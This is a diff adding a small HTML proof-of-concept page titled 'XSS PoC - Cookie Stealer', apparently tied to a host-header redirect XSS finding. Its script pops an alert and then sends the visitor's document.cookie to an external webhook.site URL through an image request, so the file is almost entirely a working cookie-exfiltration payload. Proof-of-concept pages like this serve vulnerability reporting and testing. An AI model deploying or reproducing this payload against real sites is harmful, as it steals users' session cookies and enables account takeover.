@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>XSS PoC - Cookie Stealer</title>
+  </head>
+  <body>
+    <h1>XSS Triggered & Cookies Being Collected</h1>
+    <script>
+      alert('XSS via Host Header Redirect!');
+      new Image().src = "https://webhook.site/153f214d-1755-4d6f-972f-170585abeeed/log?cookie=" + encodeURIComponent(document.cookie);
+    </script>
+  </body>
+</html>
